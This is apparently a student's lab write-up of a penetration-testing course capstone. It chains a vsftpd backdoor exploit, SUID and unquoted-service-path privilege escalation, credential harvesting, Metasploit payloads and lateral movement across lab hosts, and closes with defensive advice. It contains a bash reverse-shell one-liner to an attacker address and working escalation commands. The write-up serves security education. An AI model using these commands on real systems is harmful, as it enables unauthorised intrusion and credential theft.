# 🔴 Module 21 — Privilege Escalation Project

## 📚 What This Module Covers

This module is the Phase 3 capstone — combining Modules 15 through 20 into one complete, continuous post-exploitation narrative. No new techniques were introduced here; the goal was to demonstrate that each individual module's output fed directly into the next step, and that post-exploitation is one connected chain rather than a collection of isolated exercises.

## 🧠 Key Concepts

- **Post-exploitation is a funnel, not a checklist.** Each phase narrows and deepens: initial access gives one foothold, privilege escalation gives full control of that foothold, credential discovery turns that control into keys, lateral movement uses those keys to multiply footholds, and pivoting opens entirely new network segments.
- **Real engagements don't follow module boundaries.** Credential discovery happened during post-exploitation enumeration; privilege escalation was sometimes unnecessary because initial access already granted root. Recognizing when a step is already done — and documenting that accurately — is itself part of professional reporting.
- **The cumulative impact of a chain is always greater than any individual link.** A single vsftpd backdoor combined with password reuse, an overly permissive SSH key, and a misconfigured SUID binary became full access across multiple machines on multiple subnets. No single finding caused that — the chain did.

## 🧪 Full Post-Exploitation Chain

### Stage 1 — Initial Access (Module 10)

**Target:** Metasploitable 2 (192.168.52.128)
**Vector:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
**Method:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor, RHOSTS set to 192.168.52.128
**Result:** Root shell opened on port 6200, confirmed via whoami (root) and id (uid=0, gid=0)
**Note:** Initial access granted root directly — no privilege escalation required on this specific path. Documented as a legitimate finding rather than skipping the escalation step silently.

### Stage 2 — Post-Exploitation Enumeration (Module 19)

**Situational awareness:**
- OS: Ubuntu 8.04, kernel 2.6.24-16-server — both significantly outdated, multiple kernel CVEs applicable
- Hostname: metasploitable, running as uid=0(root)

**Network mapping:**
- `arp -a` confirmed two live internal hosts (192.168.52.129, 192.168.52.2) without sending a single probe packet
- `/etc/hosts` confirmed gateway at 192.168.52.1
- `ip route` confirmed 192.168.52.0/24 as the local subnet

**User enumeration:**
- Six accounts identified: root, daemon, msfadmin, postgres, user, service
- `lastlog` confirmed recent root login from 192.168.52.129 (attacker's Kali machine)

**Service enumeration:**
- PostgreSQL (5432) and MySQL (3306) both bound to 127.0.0.1 — invisible externally, fully accessible internally
- vsftpd (21), SSH (22), HTTP (80) confirmed running

**Sensitive data:**
- `/tmp/credentials.txt` found containing plaintext credentials
- `/home/msfadmin/.secret` identified as additional file of interest

### Stage 3 — Privilege Escalation (Modules 15 & 16)

**Linux (Module 15):**
On Metasploitable, initial access was already root — no escalation required. Demonstrated technique separately: SUID binary `vim.basic` identified via `find / -perm -4000 -type f 2>/dev/null`, cross-referenced on GTFOBins, exploited via `vim.basic -c ':!/bin/sh'` to escalate from www-data to root — confirming the technique works even when this specific target didn't require it.

**Windows (Module 16):**
Unquoted service path identified via `wmic` enumeration — "Backup Sync Service" running as SYSTEM with an unquoted path and a writable containing folder confirmed via `icacls`. Malicious executable placed at the path Windows resolves first, service restarted, landed `NT AUTHORITY\SYSTEM` shell — full Windows privilege escalation from a standard user account.

### Stage 4 — Credential Discovery (Module 17)

**From Metasploitable root shell:**
- `/var/www/html/dvwa/config/config.inc.php` — database password: dvwa
- `/var/www/html/mutillidae/config.php` — database password: root
- `~/.bash_history` — MySQL root credentials (root:root123), SSH command to admin@192.168.52.150, PostgreSQL credentials (postgres:postgres123)
- `env` — DB_PASSWORD=dvwa, API_KEY=sk-1234567890abcdef
- `/root/.ssh/id_rsa` and `/home/admin/.ssh/id_rsa` — private keys located
- `/tmp/credentials.txt` — admin:SuperSecret2024!, backup_user:Backup@123

**Aggregate:** One compromised machine yielded five distinct credential sets, two SSH private keys, an API key, and explicit documentation of other internal systems in bash history.

### Stage 5 — Shells & Payloads (Module 18)

**Progression demonstrated:**
- Netcat reverse shell established (bash -i >& /dev/tcp/192.168.52.129/4444 0>&1) — instant, zero setup, fragile
- Staged msfvenom payload (linux/x86/shell/reverse_tcp, 123-byte ELF) caught via multi/handler — smaller footprint, proper session management
- Meterpreter session established (linux/x86/meterpreter/reverse_tcp) — in-memory execution, encrypted channel, full post-exploitation toolkit available (sysinfo, getuid, upload, download, shell)

**Key finding:** Each shell type traded simplicity for capability and stealth — Meterpreter left no file on disk after execution, significantly reducing forensic trace compared to earlier stages.

### Stage 6 — Lateral Movement (Module 20)

**Using discovered credentials against internal hosts:**
- SSH with admin:SuperSecret2024! → authenticated to 192.168.52.130 (Ubuntu 14.04) — password reuse confirmed
- SSH with /root/.ssh/id_rsa → root access on 192.168.52.150 (backup server) — no password, no exploit
- impacket-psexec with msfadmin:msfadmin → NT AUTHORITY\SYSTEM on Windows host at 192.168.52.130

**Pivoting to deeper subnet:**
- `route add 192.168.100.0/24 1` routed traffic through Metasploitable session
- TCP scan via Metasploit auxiliary scanner revealed three previously invisible hosts: 192.168.100.10 (port 22), 192.168.100.15 (port 80), 192.168.100.20 (port 445)

## 🔎 Cumulative Finding Summary

| Stage | Finding | Impact |
|-------|---------|--------|
| Initial Access | vsftpd 2.3.4 backdoor | Root shell on Metasploitable |
| Enumeration | ARP cache, localhost services, user accounts | Full internal picture without scanning |
| Privesc (Linux) | SUID vim.basic | www-data → root demonstrated |
| Privesc (Windows) | Unquoted service path + writable folder | Standard user → SYSTEM |
| Credential Discovery | 5 credential sets, 2 SSH keys, 1 API key | Five new authentication doors |
| Shells & Payloads | Netcat → staged → Meterpreter | In-memory persistence, encrypted channel |
| Lateral Movement | Password reuse, SSH key reuse, Impacket, pivot | Multiple new hosts, hidden subnet exposed |

## 💡 What I Discovered

Running the full chain end to end made one thing unavoidably clear: the initial vsftpd backdoor was a single, relatively minor finding in isolation. What made it significant was everything that followed — the credentials it exposed, the hosts those credentials reached, the subnet the pivot revealed. Real post-exploitation impact isn't measured by the initial access vector; it's measured by where the chain ends up. In this case, one unpatched FTP service eventually became visibility into an entire hidden network segment and SYSTEM-level access on a Windows machine.

## 🛡️ Defensive Perspective

- Patching known CVEs (vsftpd 2.3.4 has been public since 2011) closes the initial door before the chain can start.
- Credential hygiene — unique passwords per system, no plaintext storage, restricted SSH key authorization — breaks lateral movement even after initial access is gained.
- Network segmentation limits pivot value; east-west traffic monitoring catches lateral movement patterns that perimeter monitoring misses entirely.
- Memory-based and behavioral detection (EDR) catches Meterpreter and in-memory payloads that file-based antivirus completely misses.
- The full chain from Module 10 to Module 20 demonstrates why defense in depth matters — any single control along the way (patching, credential hygiene, segmentation, monitoring) would have shortened or stopped the chain entirely.

## 📝 Lessons Learned

Post-exploitation is one continuous process, not a module-by-module checklist. The most important skill demonstrated across this capstone wasn't any individual technique — it was recognizing what each finding enabled next, and following that chain deliberately rather than running commands at random. This is exactly the mindset a real penetration test report needs to communicate: not just what was found, but why it mattered and what it made possible.

## 🏁 Conclusion

Module 21 closed Phase 3 by weaving Modules 15-20 into one complete post-exploitation narrative — from a single vsftpd backdoor through privilege escalation, credential discovery, shell progression, and lateral movement into multiple systems on multiple subnets. Phase 3 is complete. Phase 4 — Active Directory — starts next with Module 22: Active Directory Fundamentals.
